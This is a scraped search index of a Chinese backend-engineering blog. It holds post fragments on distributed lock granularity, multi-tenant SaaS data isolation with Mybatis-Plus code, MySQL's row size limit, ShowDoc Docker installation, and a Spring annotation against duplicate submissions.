分布式锁的粒度，到了boq级别，粒度很小，导致锁的数量多，获取锁和释放锁耗费大量时间； 优化： 1、总体需用计划生成中间表的时候，不需要加锁，因为还没有下游业务； 2、锁的粒度加大，增加到单位工程+项目的级别，这样锁的次数只要获取一次，（合同、合同变更、招标立项、差旅报销、对公报销、费用报销的更新中间表的地方都要改，继承了AbstractResourceDetailLockOp的类） ","date":"2024-01-19","objectID":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/:0:4","tags":["分布式锁"],"title":"分布式锁颗粒度小记--加锁时间过长","uri":"/posts/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E9%A2%97%E7%B2%92%E5%BA%A6%E5%B0%8F%E8%AE%B0--%E5%8A%A0%E9%94%81%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF/"},{"categories":["后端"],"content":"什么是多租户？举个例子：马云、马化腾和刘强东三个人去租房子，他们因为家里经济困难所以勤工俭学，三个人决定合租一套三室一厅的房子，虽然每个人有自己的房间，但是家里的水电、厨房、卫生间和热水器都是大家一起公用的。隐私性肯定是没有单独自己租房子来的高。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:0:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"写作目的 本文写作的目的是探索XaaS（IaaS、PaaS和SaaS）三种模式的概念及区别？多租户是什么？多租户可以用来干什么？有哪些租户隔离方案？这些方案的适用场景有哪些，它们各有什么优缺点？带着这些疑问，我们最后看下如何具体实现一个多租户系统。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:1:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"XaaS（一切即服务） 在讲解多租户之前，我们先来了解一下云计算的三种主要模式：IaaS、PaaS和SaaS。 IaaS(Infrastructure as a Service)，基础设施即服务。提供基于云的虚拟化计算和存储服务。 PaaS(Platform as a Service)，平台即服务。除了提供基础设施以外，PaaS还提供了基于云的操作系统、数据库和开发工具。 SaaS(Software as a Service)，软件即服务。在PaaS的基础之上，SaaS可以为任何能够联网的设备提供软件服务。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:2:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"IaaS（基础架构即服务） IaaS通过即用即付的方式为用户提供网络、存储和计算等基础设施资源。用户只需要购买和配置应用程序及系统所需的资源，然后自己负责部署、维护和开发应用程序。可以把IaaS简单理解为基于云的虚拟化硬件服务提供商，购买了IaaS的服务你就拥有了能随时随地联网的服务器。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:2:1","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"PaaS（平台即服务） 当用户购买了“硬件资源”之后，当然是想要在自己的硬件设备上安装操作系统、中间件和开发工具。PaaS可以为用户提供安装操作系统、中间件和开发工具的一站式运维服务，用户需要考虑的只是编写代码和测试应用程序。用户开发完应用程序以后，PaaS会负责应用程序后续的生命周期如构建、部署、托管以及更新。 在控制成本方面，PaaS也是非常灵活的。用户可以根据应用的客户体量和使用效期来决定购买合适的资源。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:2:2","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"SaaS（软件即服务） SaaS近几年一直是产品的风口行业。但是早在上世纪90年代，软件就作为一种服务来销售，用户按月缴纳费用，当时将这种模式称作按需服务（on-demand），它是SaaS模式的雏形。 SaaS最早的实践者一般认为是Salesforce的CEO兼创始人马克·贝尼奥夫(Marc Benioff)。他认为“一定有一种方式，让购买软件更加方便和便宜”。用户只需要订阅和付费，不需要经历漫长的开发、安装和维护周期。并且在现在这个高度信息化的时代，多端访问和数据同步已经是很多用户的刚需，用户希望无论何时何地都可以通过浏览器或者手机访问自己的应用。 关于SaaS的演进过程，这里打个比方。30年前，家家户户炒菜洗澡的气都装在煤气罐里，煤气用完了就通知煤气工人来回收并换一罐煤气。这个煤气罐就可以理解为以前的私有化部署服务。这种模式需要定时维护更新。 20年前，家家户户住上了商品房，换煤气罐上下楼太不方便，人们使用天然气直接从天然气公司订购每月缴费，按需购买，天然气公司集中供气并管理各家天然气管道。这种模式不再是私有化服务，节约了用户的使用成本和天然气公司的管理成本。我们可以将这种模式称之为“供气即服务”。 10年前，移动互联网兴起，人们不再需要去天然气公司上门缴费。手机上动动手指头，然后带着天然气卡去物业圈存即可。这就使得“供气即服务”的信息化得到进一步加强。 SaaS模式可以简单理解为用户授权，将IT设备、软件和运维统统外包给SaaS服务提供商。用户以租户的形式使用SaaS厂商提供的服务。 SaaS厂商一般不会自己去做IaaS，但SaaS和PaaS之间的定义还存在争论。PaaS除了提供操作系统开发工具以外，还可以向SaaS提供公共工具，如组织架构、权限管理和计费等。对于初创期的中小企业不具备这样的技术能力。大多数SaaS厂商的侧重点应在于应用的业务实现，而不是平台的技术能力。 小结 IaaS PaaS SaaS 名称含义 基础架构即服务(Infrastructure as a Service) 平台即服务(Platform as a Service) 软件即服务(Software as a Service) 平台提供 虚拟化的硬件计算、存储 虚拟化的硬件计算、存储操作系统、管理和开发工具 虚拟化的硬件计算、存储操作系统、管理和开发工具云应用程序 用户实现 操作系统、管理和开发工具云应用程序 云应用程序 / 用户群体 * IT运营商 DevOps团队 系统和数据库管理员 全栈开发人员 | * 有开发能力但考虑运维成本的企业 开发人员或程序员 | 没有开发能力的企业 | | 优点 | * 可以灵活扩展资源 节省成本 | * 技术门槛低 快速开发。可配置的框架和工具 管理简单。可伸缩的资源 | * 没有技术门槛 快速部署，管理简单 收费模式灵活，适用于中小企业 | | 缺点 | * 无法控制基础设施 技术门槛高 不可控的安全级别，可能存在安全漏洞 | * 灵活性降低。 依赖于厂商的可靠性和稳定性 | * 不可控的安全级别，可能存在安全漏洞 灵活性有限。无法定制需求 | | 适用场景 | 适合对计算资源要求灵活、可扩展的企业 | 适合快速部署，专注于开发的企业 | 适合无技术，需要控制成本按需购买，定制功能要求不多的中小企业 | | 具体案例 | AWS、阿里云、华为云等 | 京东云擎JAE、百度BAE、新浪SAE | 企业微信、钉钉 | 前面花了大段篇幅讲解了关于XaaS特别是SaaS模式的概念及演进过程，目的是想告诉大家SaaS的概念是在什么样的历史背景下演变而来的。下面我们从SaaS单租户和多租户两种架构开始讲解。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:2:3","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"单租户 在单租户的架构里，每个租户都有自己的一套服务器、基础设施和数据库，租户之间从硬件到软件都是完全隔离的。租户可以根据自己的需要做一些定制化的需求。 举个栗子，马云、马化腾和刘强东三个人去租房子，他们各自租了一间房，房间的水电、厨房、热水器等等都是各自一套，相互之间没有共用。 在外租过房子的童鞋都知道，自己单租房间的缺点是成本更高，优点则是只用考虑个人的租房需求来找房子，一个人住隐私安全性也更高。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:3:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"多租户 在多租户的架构里，多个租户共享相同的服务器、基础设施，数据库可以是共享的也可以是隔离的，由于多租户必定在用户规模上比单租户来的大，所以多租户一般会有多个实例，共用一套实例代码。租户之间的数据隔离往往采用逻辑隔离的方式，即在代码和数据库层面隔离，所以安全性远没有单租户来的高。 还是举上面的栗子，马云、马化腾和刘强东三个人去租房子，他们因为家里经济困难所以勤工俭学，三个人决定合租一套三室一厅的房子，虽然每个人有自己的房间，但是家里的水电、厨房、卫生间和热水器都是大家一起公用的。隐私性肯定是没有单独自己租房子来的高。 总结一下单租户和多租户的差异，有如下几点： 安全性和成本不同。单租户拥有独立的软硬件环境，数据库只存储单租户的数据；多租户则共享资源。 备份和还原的复杂度不同。单租户数据备份和还原简单；多租户因为公用一个数据库甚至公用一个表，所以备份和还原时都有可能影响到其他的租户。 定制灵活度不同。单租户适合为每个租户量身定制不同的功能，扩展灵活的高；多租户为了节约成本，也考虑到开发难度，更多的以通用配置为主，尽可能将各租户的功能抽象出来共享使用。 系统升级策略不同。单租户需要对每个租户单独升级，升级时间依各租户自己的需求而定；多租户只需要升级一次，但是为了不影响租户的使用，一般会在深夜升级系统。 所以单租户适合用在对安全管控、法律合规要求更高的中大型企业，且这些企业的需求相对更加复杂，所以更适合定制化开发；而多租户更适合对安全没有太高要求，但是希望控制成本，应用的需求相对通用简单的中小微企业。 由于多租户的架构成本更少，开发和运维的复杂度更低，所以多租户更适合企业向外复制自己的产品，也是目前比较主流的SaaS架构。但是这并不代表单租户模式没有用武之地，医院、警务、政法委、银行等对安全隐私要求更高的环境，单租户是必然的选择。 本文后面主要是以介绍多租户的实现为主。而多租户意味着要在云端集中式管理多个用户，这里的用户主要指的是面向企业或者政府，当然也有面向个人的场景。所以，要做到在同一套程序下，满足多个不同用户群体的使用，最关键的就是保证用户间数据的隔离性。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:4:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"隔离方案 多租户在数据隔离存储方案上，一般有三种实施方案： 独立数据库 共享数据库、独立Schema 共享数据库、共享Schema、共享表 独立数据库 每个租户使用独立的数据库，这种方案类似于传统的部署，其区别在于多租户的实现是将每个租户的数据库都统一管理起来。这种一租户一数据库的方案优缺点都很明显： 优点 数据隔离性好，安全级别高； 数据库表不需要额外的字段来区分租户； 需求扩展独立性好，不影响其他租户的使用； 出现故障时，恢复数据简单。 缺点 增加了数据库的安装数量和安装成本； 支持租户的数量有限； 跨租户统计数据较困难； 新增租户需要重启服务。 应用场景 适用于定价高，安全级别要求高的租户。例如，银行、医院等对数据隔离性有严格要求的租户。这些租户的特点是租户较少，数据规模大，数据隔离性强。 共享数据库、独立Schema 每个租户共享同一个数据库，但使用的是不同的Schema。像Oracle和PgSql都支持一个数据库下多个Schema。 优点 数据隔离性较好。为每个租户提供了一定程度上的逻辑隔离； 相较于独立数据库方案，可以支持的租户数量更多； 安装成本相对较低。 缺点 跨租户统计数据较困难； 各个租户的数据库sql需要带上Schema名称。 应用场景 适用于数据规模中等，租户数量中等的项目。 共享数据库、共享Schema、共享表 每个租户共享同一个数据库，同一个Schema，甚至是同一张表。每个表里都有一个tenant_id字段用来区分表里的记录是来自于哪一个租户。这种多租户方案是三个方案里隔离级别最低但是共享程度最高的一个。 优点 安装成本最低； 支持的租户数量最多； 添加租户不需要重启服务； 跨租户统计较容易。 缺点 安全性最差，隔离级别最低； 维护成本最高。其成本体现在表设计需要额外字段，sql代码需要额外查询条件，故障后数据恢复需要额外操作； 每个租户的数据量规模不宜较大。 应用场景 适用于低成本，租户数量多，租户数据量小，对安全性和隔离级别要求低的产品。例如一些To C的产品。 小结 了解了不同的多租户隔离方案以后，我们大致的明白了想要实现多租户，就应该在数据的安全性、成本、开发量以及租户的规模等因素入手，找出它们的平衡点。实际的产品功能更多，产品架构设计要考虑的因素更多，可能还会出现多种设计方案的结合使用。 成本。 隔离性越高，成本越高； 共享性越高，成本越低； 安全。 隔离性越高，安全级别越高； 共享性越高，安全性越低； 数据规模。在不考虑成本和安全因素的情况下： 租户数量越多，越倾向于共享； 单个租户的数据量越多，越倾向于隔离； 单个租户同时在线人数越多，越倾向于隔离； 对数据备份和恢复的要求越多，越倾向于隔离； 技术要求。 隔离性越高，技术要求越低； 共享性越高，技术要求越高； 对比维度 独立数据库 共享数据库、独立schema 共享数据库、共享数据架构 开发成本 低 一般 高 运维成本 高 一般 低 隔离性/安全性 高 一般 低 租户间交互能力 低 一般 高 定制化空间 高 一般 低 可支持的最大租户数量 低 一般 高 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:4:1","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"实践 前面讲了这么长的理论知识，下面我们实现一个共享表的多租户小示例。后面如果有时间我也会写一个通过ShardingJdbc实现的示例，大家可以先关注我，文章发布出来可以第一时间学习。 Mybatis-Plus实现 首先要导入maven依赖。 XML复制代码\u003cdependency\u003e \u003cgroupId\u003ecom.baomidou\u003c/groupId\u003e \u003cartifactId\u003emybatis-plus-boot-starter\u003c/artifactId\u003e \u003cversion\u003e3.4.1\u003c/version\u003e \u003c/dependency\u003e 配置 mybatis 拦截器，并设置租户拦截器 MyTenantLineHandler java复制代码@Configuration public class MyBatisConfig { @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new TenantLineInnerInterceptor(new MyTenantLineHandler())); return interceptor; } } 租户拦截器 MyTenantLineHandler 代码。实现 mybatis 自带的租户 Handler，实现 getTenantId() 方法，mybatis 执行sql 时会通过此方法将得到的租户id条件插入到sql里。 java复制代码public class MyTenantLineHandler implements TenantLineHandler { @Override public Expression getTenantId() { return new StringValue(TenantContext.getCurrentTenant()); } @Override public String getTenantIdColumn() { //这里对应的是数据库的列名 return \"tenant_id\"; } @Override public boolean ignoreTable(String tableName) { //如果那些表不需要做租户隔离的，在这里配置 return false; } } 租户上下文代码。租户上下文会保存当前请求线程里从请求头获取的租户id。 java复制代码public class TenantContext { private static String tenantId = null; private static final ThreadLocal\u003cString\u003e currentTenant = new InheritableThreadLocal\u003c\u003e(); public static String getCurrentTenant() { return currentTenant.get(); } public static void setCurrentTenant(String tenantId) { currentTenant.set(tenantId); } public static void clear() { currentTenant.remove(); } } 配置过滤器，过滤器负责将请求头传过来的租户id放入租户上下文。 java复制代码@Order(1) public class TenantFilter implements Filter { @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { TenantContext.setCurrentTenant(getHeaderOrParam(servletRequest)); filterChain.doFilter(servletRequest, servletResponse); } private String getHeaderOrParam(ServletRequest request) { HttpServletRequest httpRequest = (HttpServletRequest) request; return h","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:4:2","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["后端"],"content":"总结 XaaS（IaaS、PaaS和SaaS）三种模式的概念及区别？ 多租户是什么？ 多租户可以用来干什么？ 有哪些租户隔离方案？ 这些方案的适用场景有哪些，它们各有什么优缺点？ XaaS（IaaS、PaaS和SaaS）三种模式的概念及区别？ IaaS（Infrastructure as a Service），中文名叫基础架构即服务。通过即用即付的方式为用户提供网络、存储和计算等基础设施资源。IaaS可以节约用户成本，也更加灵活易扩展，适合全栈开发者。 PaaS（Platform as a Service），中文名叫平台即服务。除了为用户提供基础设施资源，PaaS还可以为用户提供操作系统、中间件和开发工具等。PaaS适合有一定开发能力但运维成本有限的用户。 SaaS（Software as a Service），中文名叫软件即服务。SaaS模式可以简单理解为用户授权，将IT设备、软件和运维统统外包给SaaS服务提供商。用户以租户的形式使用SaaS厂商提供的服务。SaaS适合没有开发能力，想要快速部署的用户。 多租户是什么？ 在多租户的架构里，多个租户共享相同的服务器、基础设施，数据库可以是共享的也可以是隔离的，由于多租户必定在用户规模上比单租户来的大，所以多租户一般会有多个实例，共用一套实例代码。租户之间的数据隔离往往采用逻辑隔离的方式，即在代码和数据库层面隔离，所以安全性远没有单租户来的高。 多租户可以用来干什么？ 多租户可以让用户买到便宜并且部署快速、方便的软件服务。 有哪些租户隔离方案？ 独立数据库 共享数据库、独立Schema 共享数据库、共享Schema、共享表 这些方案的适用场景有哪些，它们各有什么优缺点？ 对比维度 独立数据库 共享数据库、独立schema 共享数据库、共享数据架构 开发成本 低 一般 高 运维成本 高 一般 低 隔离性/安全性 高 一般 低 租户间交互能力 低 一般 高 定制化空间 高 一般 低 可支持的最大租户数量 低 一般 高 作者：IT果果日记 链接：https://juejin.cn/post/7321049383569948681 来源：稀土掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2024-01-17","objectID":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/:5:0","tags":[],"title":"多租户系统概念简介","uri":"/posts/%E5%A4%9A%E7%A7%9F%E6%88%B7%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E7%AE%80%E4%BB%8B/"},{"categories":["数据库"],"content":"Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs 这个还真没遇到过，但是发现这个65535，感觉不是Excel行数的问题吗，咋MySQL里还会报这个问题？ 仔细看看这个错误，应该是说行大小超了，然后百度了下这个错误 看网上的介绍说是，MySQL建表有个长度限制，一个行的定义长度不能超过65535； 原来如此，这个主要和表中的varchar类型有关，我么可以把长文本修改为Text，这个是不限制的。 这个是后台自动生成的字段，果然太坑了，都是999，然后，我就把表的字段长度都改为200了，然后就可以了。 记录下这个问题。 分析 首先来了解几个MySQL规则，对我们的字符数有影响的规则 编码规则 不同字符集下，占用空间不一样 gbk编码中，1个字符占用2个字节 utf8编码（默认）中，1个字符占用3个字节 utf8mb4编码中，1个字符占用4个字节 存储规则 varchar除了存储字符，还需要额外的空间来存储长度和是否为NULL，分别占用1-2字节和1字节 行大小限制 MySQL 表的内部表示具有 65,535 字节的最大行大小限制，即使存储引擎能够支持更大的行。BLOB 和 TEXT列仅对行大小限制贡献 9 到 12 个字节，因为它们的内容与行的其余部分分开存储 接下来，我们进行验证下 根据行最大65535字节，我们选择utf8编码，那我们最多可以设置的字符数为65535/3=21845 还是报错了，因为我们还需要减去额外的存储（长度和是否为NULL），65535-3=65532/2=21844，设置成21844就成功了 计算规则=（65535-4-2-1）/3=21,842.66666666667，向下取整，就是21842 说明：int占用4个字节，varchar的长度和是否为NULL占用3个字节，使用了utf8编码，1个字符占用3个字节 解决方案 如果长度需要加长，将字段类型改为TEXT或BLOB 如果只是想设置一个最大值，那可以根据计算规则进行调整 拓展 1、为什么我们经常使用varchar(255)，不使用varchar(256)？ 首先我们使用的varchar，除了存储字符内容，还需要额外存储长度和是否为NULL 因为varchar类型的字段长度在超过255后，需要2个字节来存储长度，因为1个字节=8位，可以表示的长度为255，2个字节=16位，可以表示的长度为65535 所以varchar(256)会比varchar(255)多占用1个字节来存储长度 2、MySQL列数限制 MySQL 对每个表有 4096 列的硬性限制，但对于给定的表，有效最大值可能会更少，因为表的最大行大小限制了列的数量 3、int类型的占用空间的大小范围 4、验证NULL占用1个字节 我们定义两个字段，tinyint和varchar tinyint占用1个字节、varchar的长度和是否为NULL占用3个字节 计算规则：65535-1-3=65531/3=21,843.66666666667，向下取整，最多只能21843 所以长度设为21844就会报错，如下： 我们把varchar字段设为不是null，计算规则：65535-1-2=65532/3=21844，设为21844就成功了 ","date":"2024-01-08","objectID":"/posts/row-size-too-large.-the-maximum-row-sizemysql%E8%A1%8C%E9%95%BF%E5%BA%A6%E8%B6%85%E8%BF%8765535/:0:0","tags":["Row size too large"],"title":"Row size too large. The maximum row size(Mysql行长度超过65535)","uri":"/posts/row-size-too-large.-the-maximum-row-sizemysql%E8%A1%8C%E9%95%BF%E5%BA%A6%E8%B6%85%E8%BF%8765535/"},{"categories":["运维"],"content":"ShowDoc官网：https://www.showdoc.com.cn/help 安装 # 原版官方镜像安装命令(中国大陆用户不建议直接使用原版镜像，可以用后面的加速镜像) # 如果你打算安装ARM版本的docker镜像，请将 latest 标签改为 arm-latest docker pull star7th/showdoc:latest # 中国大陆镜像安装命令（安装后记得执行docker tag命令以进行重命名） docker pull registry.cn-shenzhen.aliyuncs.com/star7th/showdoc docker tag registry.cn-shenzhen.aliyuncs.com/star7th/showdoc:latest star7th/showdoc:latest ##后续命令无论使用官方镜像还是加速镜像都需要执行 #新建存放showdoc数据的目录 mkdir -p /showdoc_data/html chmod -R 777 /showdoc_data # 如果你是想把数据挂载到其他目录，比如说/data1，那么，可以在/data1目录下新建一个showdoc_data/目录， # 然后在根目录的新建一个软链接/showdoc_data到/data1/showdoc_data # 这样既能保持跟官方教程推荐的路径一致，又能达到自定义存储的目的. #启动showdoc容器 docker run -d --name showdoc --user=root --privileged=true -p 4999:80 \\ -v /showdoc_data/html:/var/www/html/ star7th/showdoc 根据以上命令操作的话，往后showdoc的数据都会存放在 /showdoc_data/html 目录下。 你可以打开 http://localhost:4999 来访问showdoc (localhost可改为你的服务器域名或者IP)。账户密码是showdoc/123456，登录后你便可以看到右上方的管理后台入口。建议登录后修改密码。 升级 docker升级 # 从原版官方库更新镜像。(中国大陆用户不建议直接使用原版镜像，可以用后面的加速镜像) docker pull star7th/showdoc # 中国大陆镜像更新命令（更新后记得执行docker tag命令以进行重命名） docker pull registry.cn-shenzhen.aliyuncs.com/star7th/showdoc docker tag registry.cn-shenzhen.aliyuncs.com/star7th/showdoc:latest star7th/showdoc:latest ##后续命令无论使用官方镜像还是加速镜像都需要执行 rm -rf /showdoc_data/html_bak #备份。如果可以的话，命令中的html_bak还可以加上日期后缀，以便保留不同日期的多个备份 mv /showdoc_data/html /showdoc_data/html_bak # 新建准备存放新版代码的目录 mkdir -p /showdoc_data/html chmod -R 777 /showdoc_data/html # 删除旧容器 docker stop showdoc \u0026\u0026 docker rm showdoc #启动showdoc容器 docker run -d --name showdoc --user=root --privileged=true -p 4999:80 \\ -v /showdoc_data/html:/var/www/html/ star7th/showdoc #执行新代码安装。默认安装中文版。如果想安装英文版，将下面参数中的zh改为en curl http://localhost:4999/install/non_interactive.php?lang=zh #转移旧数据库 \\cp -f /showdoc_data/html_bak/Sqlite/showdoc.db.php /showdoc_data/html/Sqlite/showdoc.db.php #转移旧附件数据 \\cp -r -f /showdoc_data/html_bak/Public/Uploads/. /showdoc_data/html/Public/Uploads # 重新给权限 chmod -R 777 /showdoc_data/html #如果中途出错，请重命名原来的/showdoc_data/html_bak文件为/showdoc_data/","date":"2024-01-03","objectID":"/posts/docker%E4%B9%8Bshowdoc%E5%AE%89%E8%A3%85/:0:0","tags":["Docker","ShowDoc","共享文档管理"],"title":"Docker之ShowDoc安装","uri":"/posts/docker%E4%B9%8Bshowdoc%E5%AE%89%E8%A3%85/"},{"categories":["Java后端"],"content":"在一些新增的场景下，往往都会采取各种方式去防止重复提交。否则当新增逻辑执行较慢时，用户多次点击提交按钮，就会导致数据库中出现多条重复数据或者后端执行出错。 那么防止重复提交最简单的方式就是从前端出发，让前端设置按钮为只可以点击一次，但是前端是可以被跳过的。要想根治还得需要从后端入手。 本篇文章提供了一种通过自定义注解的方式来解决某一场景下某个实体只能被提交一次。 ","date":"2024-01-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/:0:0","tags":[],"title":"如何优雅地避免重复提交","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"},{"categories":["Java后端"],"content":"具体使用示例： /** * @ApiResubmit注解防止重复提交， * prefix - 用来标识场景，不填默认为类名+方法名 * key - 限流key，用来辨别是否是一次重复的请求 * forbidSeconds - 请求禁止秒数 * message - 限流提示信息 * * 此处表示同一个学生id，在2秒内只能够提交一次作业 * @param homeWorkCommitReq * @return */ @PostMapping(\"/commit/homeWork\") @ApiResubmit(prefix = \"commitHomeWork\", key = \"#homeWorkCommitReq.studentId\",forbidSeconds = 2, message = \"正在提交中，请稍后再试\") @ApiOperation(value = \"学生交作业接口\") public Result\u003cHomeWorkCommitResp\u003e homeWorkCommit(@RequestBody HomeWorkCommitReq homeWorkCommitReq) { return Result.success(homeWorkBizService.homeWorkCommit(recheckCommitReq)); } ","date":"2024-01-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/:0:1","tags":[],"title":"如何优雅地避免重复提交","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"},{"categories":["Java后端"],"content":"@ApiResubmit注解具体定义 @Target({ElementType.METHOD}) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface ApiResubmit { /** * 限流前缀，用来区分不同的限流场景 */ String prefix() default \"\"; /** * 限流key，用来辨别是否是一次重复的请求，支持SpEL，可以从方法的入参中获取 */ String key() default \"\"; /** * 请求禁止秒数，即在多少秒内禁止重复请求 */ int forbidSeconds() default 3; /** * 限流提示信息 */ String message() default \"请求过于频繁，请稍后再试\"; } ","date":"2024-01-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/:0:2","tags":[],"title":"如何优雅地避免重复提交","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"},{"categories":["Java后端"],"content":"注解切面逻辑： @Aspect @Component @Slf4j public class ResubmitAspect { //默认的提示语 private static final String DEFAULT_BLOCKING_MESSAGE = \"提交的频率过快，请稍后再试\"; //切点 @Pointcut(\"@annotation(ApiResubmit)\") public void resubmitPointcut() { } @Around(value = \"resubmitPointcut()\") public Object checkResubmit(ProceedingJoinPoint joinPoint) throws Throwable { MethodSignature signature = (MethodSignature) joinPoint.getSignature(); Method method = signature.getMethod(); ApiResubmit annotation = AnnotationUtils.findAnnotation(method, ApiResubmit.class); if (annotation != null) { //如果这个方法标注这个注解 //以类名+方法名作为key的默认前缀 String defaultPrefix = joinPoint.getSignature().getDeclaringTypeName() + \"#\" + method.getName(); //获取此方法所传入的参数 map\u003c参数名, 参数值\u003e Map\u003cString, Object\u003e methodParam = getMethodParam(joinPoint); validate(annotation, defaultPrefix, methodParam); } return joinPoint.proceed(); } private Map\u003cString, Object\u003e getMethodParam(ProceedingJoinPoint joinPoint) { Object[] args = joinPoint.getArgs(); String[] parameterNames = ((MethodSignature) joinPoint.getSignature()).getParameterNames(); Map\u003cString, Object\u003e paramMap = new HashMap\u003c\u003e(args.length); for (int i = 0; i \u003c args.length; i++) { paramMap.put(parameterNames[i], args[i]); } return paramMap; } private void validate(ApiResubmit annotation, String defaultPrefix, Map\u003cString, Object\u003e methodParam) { try { String prefix = StringUtils.isBlank(annotation.prefix()) ? defaultPrefix : annotation.prefix(); //去解析spel语句 